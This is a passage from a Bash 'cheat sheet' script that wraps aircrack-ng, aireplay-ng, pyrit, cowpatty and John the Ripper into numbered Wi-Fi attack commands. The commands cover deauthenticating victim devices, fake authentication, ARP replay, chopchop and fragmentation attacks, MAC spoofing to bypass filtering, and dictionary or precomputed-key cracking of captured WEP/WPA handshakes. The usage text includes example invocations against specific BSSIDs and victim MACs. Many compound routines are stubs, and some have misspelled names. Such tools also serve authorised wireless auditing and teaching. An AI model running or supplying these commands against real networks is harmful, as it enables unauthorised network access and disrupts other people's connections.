    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local WORDLIST_FILE="$7"
    local SQLITE3_DB="${8:-KirovDB}"
    local INTERFACE="${9:-wlan0}"
    local CHANNEL=${10:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    airolib_import_essids - $SQLITE3_DB "$ESSID_FILE"
    airolib_import_passwords - $SQLITE3_DB "$WORDLIST_FILE"
    airolib_clean_database_junk - $SQLITE3_DB
    airolib_show_database_stats - $SQLITE3_DB
    airolib_start_batch_processing - $SQLITE3_DB
    airolib_verify_all_pairwise_master_keys - $SQLITE3_DB
    start_database_attack - $SQLITE3_DB "$CAPTURE_FILE"
    return $?
}

function fake_authentication_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local INTERFACE="${7:-wlan0}"
    local CHANNEL=${8:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    show_interface_mac_address - "${INTERFACE}mon"
    start_fake_auth_attack - "$ESSID" "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 0
    start_interactive_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 1 68 86 1000 0841
    brute_crack_wep_key - "$CAPTURE_FILE" "$BSSID"
    return $?
}

function arp_replay_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local BSSID="$2"
    local NET_DUMP_PREFIX="$3"
    local CAPTURE_FILE="$4"
    local VICTIM_MAC="$5"
    local INTERFACE="${6:-wlan0}"
    local CHANNEL=${7:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    show_interface_mac_address - "${INTERFACE}mon"
    start_interactive_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 1 0 1000 1000
    brute_crack_wep_key - "$CAPTURE_FILE" "$BSSID"
    return $?
}

function chopchop_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local PRGA_FILE="$7"
    local INTERFACE="${8:-wlan0}"
    local CHANNEL=${9:-5}
    local SRC_IPv4_PORT="${10:-255.255.255.255}"
    local DST_IPV4_PORT="${11:-255.255.255.255}"
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    show_interface_mac_address - "${INTERFACE}mon"
    start_fake_auth_attack - "$ESSID" "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 0 1
    start_chopchop_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    forge_encrypted_packets_from_prga - "$BSSID" "$VICTIM_MAC" "$PRGA_FILE" "$CAPTURE_FILE" "$SRC_IPv4_PORT" "$DST_IPV4_PORT"
    start_interactive_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    brute_crack_wep_key - "$CAPTURE_FILE"
    return $?
}

function fragmentation_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local PRGA_FILE="$7"
    local INTERFACE="${8:-wlan0}"
    local CHANNEL=${9:-5}
    local SRC_IPv4_PORT="${10:-255.255.255.255}"
    local DST_IPV4_PORT="${11:-255.255.255.255}"
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    show_interface_mac_address - "${INTERFACE}mon"
    start_fake_auth_attack - "$ESSID" "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    start_fragment_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    forge_encrypted_packets_from_prga - "$BSSID" "$VICTIM_MAC" "$PRGA_FILE" "$CAPTURE_FILE" "$SRC_IPv4_PORT" "$DST_IPV4_PORT"
    start_interactive_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    brute_crack_wep_key - "$CAPTURE_FILE"
    return $?
}

function shared_key_authentication_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local BSSID="$2"
    local NET_DUMP_PREFIX="$3"
    local CAPTURE_FILE="$4"
    local VICTIM_MAC="$5"
    local INTERFACE="${6:-wlan0}"
    local CHANNEL=${7:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 10
    tear_down_interface - "${INTERFACE}mon"
    change_interface_mac_address "$VICTIM_MAC" "${INTERFACE}mon"
    set_up_interface - "${INTERFACE}mon"
    start_arp_replay_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 1
    brute_crack_wep_key - "$CAPTURE_FILE" "$BSSID"
    return $?
}

# DISPLAY

function display_usage () {
    display_header
    cat <<EOF
 1. airolib-import-essids___________________________<SQLITE3-DB-FILE> <ACCESS-POINT-ESSID-FILE>_______________airolib-ng <sqlite3-db-file> --import essid <ap-essid-file>
 2. airolib-import-passwords________________________<SQLITE3-DB-FILE> <ACCESS-POINT-PASSWD-FILE>______________airolib-ng <sqlite3-db-file> --import passwd <ap-passwd-file>
 3. airolib-clean-database-junk_____________________<SQLITE3-DB-FILE>_________________________________________airolib-ng <sqlite3-db-file> --clean all
 4. airolib-show-database-stats_____________________<SQLITE3-DB-FILE>_________________________________________airolib-ng <sqlite3-db-file> --stats
 5. airolib-start-batch-processing__________________<SQLITE3-DB-FILE>_________________________________________airolib-ng <sqlite3-db-file> --batch
 6. airolib-verify-all-pairwise-master-keys_________<SQLITE3-DB-FILE>_________________________________________airolib-ng <sqlite3-db-file> --verify all
 7. pyrit-translate-database-password-master-keys_____________________________________________________________pyrit batch
 8. pyrit-add-essid-to-database_____________________<ACCESS-POINT-ESSID>______________________________________pyrit -e <access-point-essid> create_essid
 9. pyrit-attack-eapol-handshake-in-capture-file____<CAPTURE-FILE>____________________________________________pyrit -r <capture-file> attack_db
10. pyrit-import-wordlist___________________________<WORDLIST-FILE>___________________________________________pyrit -i <wordlist-file> import_passwords
11. pyrit-dict-crack-wep-key________________________<WORDLIST-FILE> <CAPTURE-FILE> <ACCESS-POINT-BSSID>_______pyrit -r <capture-file> -b <ap-bssid> -i <wordlist-file> attack_passthrough
12. cowpatty-hash-crack-wep-key_____________________<HASH-FILE> <CAPTURE-FILE> <ACCESS-POINT-ESSID>___________cowpatty -r <capture-file> -d <hash-file> -2 -s <ap-essid>
13. cowpatty-dict-crack-wep-key_____________________<WORDLIST-FILE> <CAPTURE-FILE> <ACCESS-POINT-ESSID>_______cowpatty -r <capture-file> -f <wordlist-file> -s <ap-essid>
14. show-interface-details__________________________(INTERFACE|all)___________________________________________ifconfig <interface>
15. show-interface-mac-address______________________(INTERFACE|wlan0mon)______________________________________ifconfig <interface> | grep 'ether' | awk '{print \$2}'
16. show-all-interface-details________________________________________________________________________________iwconfig
17. show-wireless-device-details______________________________________________________________________________iw list
18. start-deauth-attack______<ACCESS-POINT-BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon) (DELAY|20)________________aireplay-ng -0 <deplay> -a <ap-bssid> -c <victim-mac> <interface>
19. start-monitor-interface_________________________(INTERFACE|wlan0) (CHANNEL|5)_____________________________airmon-ng start <interface> <channel>
20. start-fake-auth-attack___<ESSID> <BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon) (DELAY|0) (KEEP-ALIVE|1)_______aireplay-ng -1 <delay> -e <essid> -a <bssid> -h <victim-mac> -q <keep-alive> <interface>
21. start-interactive-attack_<BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon) (FRAMES|1) (MIN-PCKT|68) (MAX-PCKT|86) (PCKTS/SEC|1000) (FRAME-CTL)__aireplay-ng -2 -p <frame-control-hex> -b <ap-bssid> -d <victim-mac> -f <frames> -m <min-packet-size> -n <max-packet-size> <interface>
22. start-ptw-attack________________________________<CAPTURE-FILE> (MAX-PCKT-SIZE|64)_________________________aircrack-ng -0 -z -n <max-packet-size> <capture-file>
23. start-fragment-attack___________________________<ACCESS-POINT-BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon)____aireplay-ng -5 -b <ap-bssid> -h <victim-mac> <interface>
24. start-arp-replay-attack_________________________<ACCESS-POINT-BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon)____aireplay-ng -3 -b <ap-bssid> -h <victim-mac> <interface>
25. start-database-attack___________________________<SQLITE3-DB-FILE> <CAPTURE-FILE>__________________________aircrack-ng -r <sqlite3-db-file> <capture-file>
26. start-chopchop-attack___________________________<ACCESS-POINT-BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon)____aireplay-ng -4 -b <ap-bssid> -h <victim-mac> <interface>
27. restart_wpa_supplicant____________________________________________________________________________________service wpa_supplicant restart
28. set-interface-monitor-mode______________________(INTERFACE|wlan0mon)______________________________________iwconfig <interface> mode monitor
29. set-up-interface________________________________(INTERFACE|wlan0mon)______________________________________ifconfig <interface> up
30. set-wifi-regulatory-domain______________________(REG-DOMAIN|BO)___________________________________________iw reg set <reg-domain>
31. stop-monitor-interface__________________________(INTERFACE|wlan0mon)______________________________________airmon-ng stop <interface>
32. check-interface_________________________________(INTERFACE|wlan0)_________________________________________iwconfig <interface>
33. check-injection-is_working______________________(INTERFACE|wlan0mon)______________________________________aireplay-ng -9 <interface>
34. monitor-wireless-access-point___________________<ACCESS-POINT-BSSID> (INTERFACE|wlan0mon) (CHANNEL|5)_____airodump-ng -c <channel> --bssid <ap-bssid> <interface>
35. monitor-victim-mac-on-interface-channel_________<BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon) (CHANNEL|5)_____airodump-ng -c <channel> -bssid <ap-bssid> -c <victim-mac> <interface>
36. monitor-interface_______________________________(INTERFACE|wlan0mon)______________________________________airodump-ng <interface>
37. change-interface-channel________________________(INTERFACE|wlan0) (CHANNEL|5)_____________________________iwconfig <interface> channel <channel>
38. change-interface-mac-address____________________<NEW-MAC> (INTERFACE|wlan0)_______________________________macchanger -mac <new-mac> <interface>
39. wpa-precomputation-attack_______________________<ACCESS-POINT-ESSID> <WORDLIST-FILE> (OUT-HASH-FILE|-)____genpmk -s <ap-essid> -f <wordlist-file> -d <out-file>
40. brute-crack-wep-key_____________________________<CAPTURE-FILE> (ACCESS-POINT-BSSID)_______________________aircrack-ng -b <ap-bssid> <capture-file>
41. john-dict-crack-wep-key_________________________<WORDLIST-FILE> <CAPTURE-FILE> <ACCESS-POINT-ESSID>_______john --wordlist=<wordlist-file> --rules --stdout | aircrack-ng -0 -e <ap-essid> -w - <capture-file>
42. dictionary-crack-wep-key________________________<WORDLIST-FILE> <CAPTURE-FILE> <ACCESS-POINT-BSSID>_______aircrack-ng -w <wordlist-file> -b <bssid>
43. tear-down-interface_____________________________(INTERFACE|wlan0mon)______________________________________ifconfig <interface> down
44. wavemon___________________________________________________________________________________________________wavemon
45. capture-access-point-packets-to-pcap__<BSSID> <CAPTURE-FILES-PREFIX> (INTERFACE|wlan0mon) (CHANNEL|5)_____airodump-ng -c <channel> --bssid <ap-bssid> -w <capture-files-prefix> <interface>
46. ptw-crack-wep-key_______________________________<CAPTURE-FILE>____________________________________________aircrack-ng -0 <capture-file>
47. update-interface-txpower________________________(INTERFACE|wlan0) (POWER|25)______________________________iwconfig <interface> txpower <power>
48. inject-packets-from-cap-file____________________<CAPTURE-FILE> (INTERFACE|wlan0mon)_______________________aireplay-ng -2 -r <capture-file> <interface>
49. forge-encrypted-packets-from-prga__<BSSID> <VICTIM-MAC> <PRGA-FILE> <CAPTURE-FILE> (SRC-IPv4) (DST-IPV4)__packetforge-ng -0 -a <ap-bssid> -h <victim-mac> -k <dst-ipv4> -l <src-ipv4> -y <prga-file> -w <capture-file>
50. read-linklevel-headers-from-capture-file________<CAPTURE-FILE>____________________________________________tcpdump -n -vvv -e -s0 -r <capture-file>
51. cleanup-capture-files___________________________<FILE-PREFIX1> <FILE-PREFIX2>...__________________________for fl_prfx in \${FILE_PREFIXES[@]}; do rm -i \${fl_prfx}*; done
52. -h | --help_______________________________________________________________________________________________Display this nessage.

    [ COMPOUND ]: Under construction - use as guidelines only.

53. stop-monitor-mode_______________________________COMPOUND (31) + (36)
54. start-monitor-mode______________________________COMPOUND (19) + (36)
55. set-tx-power____________________________________COMPOUND (30) + (47) + (16)
56. set-monitor-mode________________________________COMPOUND (43) + (28) + (29)
57. reset-interface_________________________________COMPOUND (31) + (27)
58. deauthenticate-device-off-access-point__________COMPOUND (37) + (18)
59. find-hidden-ssid________________________________COMPOUND (19) + (34) + (37) + (18)
60. bypass-mac-filtering____________________________COMPOUND (19) + (35) + (43) + (38) + (29) + (21)
61. crack-wpa_______________________________________COMPOUND (19) + (16) + (45) + (18) + (42)
62. crack-wep-with-connected-clients________________COMPOUND (19) + (45) + (20) + (21) + (48) + (22)
63. crack-wep-shared-key-auth_______________________COMPOUND (19) + (45) + (18) + (20) + (21) + (18) + (22)
64. crack-clientless-wep-frag_______________________COMPOUND (19) + (45) + (20) + (23) + (49) + (50) + (21)
65. crack-clientless-wep-korek______________________COMPOUND (19) + (45) + (20) + (26) + (50) + (49) + (48) + (46)
66. arp-amplification_______________________________COMPOUND (19) + (45) + (20) + (23) + (49) + (50) + (49) + (48)
67. dictionary-attack_______________________________COMPOUND (19) + (45) + (18) + (42)
68. dictionary-john-attack__________________________COMPOUND (19) + (45) + (18) + (41)
69. dictionary-cowpatty-attack______________________COMPOUND (19) + (45) + (18) + (13) + (39) + (13)
70. dictionary-pyrit-attack_________________________COMPOUND (19) + (45) + (18) + (11) + (10) + ( 8) + ( 7) + ( 9)
71. precomputed-wpa-keys-database-attack____________COMPOUND (19) + (45) + (18) + ( 1) + ( 2) + ( 3) + ( 4) + ( 5) + ( 6) + (25)
72. fake-authentication-attack______________________COMPOUND (19) + (45) + (15) + (20) + (21) + (40)
73. arp-replay-attack_______________________________COMPOUND (19) + (45) + (15) + (21) + (40)
74. chopchop-attack_________________________________COMPOUND (19) + (45) + (15) + (20) + (26) + (49) + (21) + (40)
75. fragmentation-attack____________________________COMPOUND (19) + (45) + (15) + (20) + (23) + (49) + (21) + (40)
76. shared-key-authentication-attack________________COMPOUND (19) + (45) + (18) + (43) + (38) + (29) + (24) + (18) + (40)

[ EXAMPLE ]: ./`basename $0` start-monitor-interface wlan0 5
[ EXAMPLE ]: ./`basename $0` 45 04:88:E6:86:5C:51 dummy-cap-session wlan0mon 5
[ EXAMPLE ]: ./`basename $0` start-deauth-attack 04:88:E6:86:5C:51 2E:A7:61:3E:FF:8E wlan0mon 20
[ EXAMPLE ]: ./`basename $0` dictionary-crack-wep-key /tmp/top25k-worst.pwd dummy-cap-session-01.cap 04:88:E6:86:5C:51

EOF
    return $?
}

function display_header () {
    echo "
    ___________________________________________________________________________

     *            *               ${SCRIPT_NAME} Cheat Sheet             *            *
    _______________________________________________________v.${VERSION}___________
                        Regards, the Alveare Solutions society.
    "

    return $?
}

function exec_msg () {
    local MSG="$@"
    echo "[ EXEC ]: $MSG"
    return $?
}

# INIT

function init_cheat_sheet () {
    local INSTRUCTION="$1"
    case "$INSTRUCTION" in
        52|-h|--help)
            display_usage
            return $?
            ;;
        1|'airolib-import-essids')
            airolib_import_essids $@
            ;;
        2|'airolib_import_passwords')
            airolib_import_passwords $@
            ;;
        3|'airolib-clean-database-junk')
            airolib_clean_database_junk $@
            ;;
        4|'airolib-show-database-stats')
            airolib_show_database_stats $@
            ;;
        5|'airolib-start-batch-processing')
            airolib_start_batch_processing $@
            ;;
        6|'airolib-verify-all-pairwise-master-keys')
            airolib_verify_all_pairwise_master_keys $@
            ;;
        7|'pyrit-translate-database-password-master-keys')
            pyrit_translate_database_password_master_keys $@
            ;;
        8|'pyrit-add-essid-to-database')
            pyrit_add_essid_to_database $@
            ;;
        9|'pyrit-attack-eapol-handshake-in-capture-file')
            pyrit_attack_eapol_handshake_in_capture_file $@
            ;;
        10|'pyrit-import-wordlist')
            pyrit_import_wordlist $@
            ;;
        11|'pyrit-dict-crack-wep-key')
            pyrit_dict_crack_wep_key $@
            ;;
        12|'cowpatty-hash-crack-wep-key')
            cowpatty_hash_crack_wep_key $@
            ;;
        13|'cowpatty-dict-crack-wep-key')
            cowpatty_dict_crack_wep_key $@
            ;;
        14|'show-interface-details')
            show_interface_details $@
            ;;
        15|'show-interface-mac-address')
            show_interface_mac_address $@
            ;;
        16|'show-all-interface-details')
            show_all_interface_details $@
            ;;
        17|'show-wireless-device-details')
            show_wireless_device_details $@
            ;;
        18|'start-deauth-attack')
            start_deauth_attack $@
            ;;
        19|'start-monitor-interface')
            start_monitor_interface $@
            ;;
        20|'start-fake-auth-attack')
            start_fake_auth_attack $@
            ;;
        21|'start-interactive-attack')
            start_interactive_attack $@
            ;;
        22|'start-ptw-attack')
            start_ptw_attack $@
            ;;
        23|'start-fragment-attack')
            start_fragment_attack $@
            ;;
        24|'start-arp-replay-attack')
            start_arp_replay_attack $@
            ;;
        25|'start-database-attack')
            start_database_attack $@
            ;;
        26|'start-chopchop-attack')
            start_chopchop_attack $@
            ;;
        27|'restart-wpa-supplicant')
            restart_wpa_supplicant $@
            ;;
        28|'set-interface-monitor-mode')
            set_interface_monitor_mode $@
            ;;
        29|'set-up-interface')
            set_up_interface $@
            ;;
        30|'set-wifi-regulatory-domain')
            set_wifi_regulatory_domain $@
            ;;
        31|'stop-monitor-interface')
            stop_monitor_interface $@
            ;;
        32|'check-interface')
            check_interface $@
            ;;
        33|'check-injection-is-working')
            check_injection_is_working $@
            ;;
        34|'monitor-wireless-access-point')
            monitor_wireless_access_point $@
            ;;
        35|'monitor-victim-mac-on-interface-channel')
            monitor_victim_mac_on_interface_channel $@
            ;;
        36|'monitor-interface')
            monitor_interface $@
            ;;
        37|'change-interface-channel')
            change_interface_channel $@
            ;;
        38|'change-interface-mac-address')
            change_interface_mac_address $@
            ;;
        39|'wpa-precomputation-attack')
            wpa_precomputation_attack $@
            ;;
        40|'brute-crack-wep-key')
            brute_crack_wep_key $@
            ;;
        41|'john-dict-crack-wep-key')
            john_dict_crack_wep_key $@
            ;;
        42|'dictionary-crack-wep-key')
            dictionary_crack_wep_key $@
            ;;
        43|'tear-down-interface')
            tear_down_interface $@
            ;;
        44|'wavemon')
            wavemon $@
            ;;
        45|'capture-access-point-packets-to-pcap')
            capture_access_point_packets_to_pcap $@
            ;;
        46|'ptw-crack-wep-key')
            ptw_crack_wep_key $@
            ;;
        47|'update-interface-txpower')
            update_interface_txpower $@
            ;;
        48|'inject-packets-from-cap-file')
            inject_packets_from_cap_file $@
            ;;
        49|'forge-encrypted-packets-from-prga')
            forge_encrypted_packets_from_prga $@
            ;;
        50|'read-linklevel-headers-from-capture-file')
            read_linklevel_headers_from_capture_file $@
            ;;
        51|'cleanup-capture-files')
            cleanup_capture_files $@
            ;;


        53|'start-monitor-mode')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           start_monitor_mode $@
            ;;
        54|'stop-monitor-mode')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           stop_monitor_mode $@
            ;;
        55|'set-tx-power')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           set_tx_power $@
            ;;
        56|'set-monitor-mode')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           set_monitor_mode $@
            ;;
        57|'reset-interface')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           reset_interface $@
            ;;
        58|'deauthenticate-device-off-access-point')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           deauthenticate_device_off_access_point $@
            ;;
        59|'find-hidden-ssid')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           find_hidden_ssid $@
            ;;
        60|'bypass-mac-filtering')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           bypass_mac_filtering $@
            ;;
        61|'crack-wpa')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           crack_wpa $@
            ;;
        62|'crack-wep-with-connected-clients')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           crack_wep_with_connected_clients $@
            ;;
        63|'crack-wep-shared-key-auth')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           crack_wep_shared_key_auth $@
            ;;
        64|'crack-clientless-wep-frag')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           crack_clientless_wep_frag $@
            ;;
        65|'crack-clientless-wep-korek')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           crack_clientless_wep_korek $@
            ;;
        66|'arp-amplification')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           arp_amplification $@
            ;;
        67|'dictionary-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           dictionary_attack $@
            ;;
        68|'dictionary-john-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           dictionary_john_attack $@
            ;;
        69|'dictionary-cowpatty-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           dictionary_cowpatty_attack $@
            ;;
        70|'dictionary-pyrit-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           dictionary_pyrit_attack $@
            ;;
        71|'precomputed-wpa-keys-database-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           precomputed_wpa_keys_database_attack $@
            ;;
        72|'fake-authentication-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           fake_authentication_attack $@
            ;;
        73|'arp-replay-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           arp_replay_attack $@
            ;;
        74|'chopchop-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           chopchop_attack $@
            ;;
        75|'fragmentation-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           ragmentation_attack $@
            ;;
        76|'shared-key-authentication-attack')
            echo "[ WARNING ]: Under construction - use as guideline only."
#           fshared_key_authentication_attack $@
            ;;
        *)
            echo "[ WARNING ]: Invalid instruction! ($INSTRUCTION)"
            return 1
            ;;
    esac
    return $?
}

# MISCELLANEOUS

init_cheat_sheet $@
exit $?

# CODE DUMP

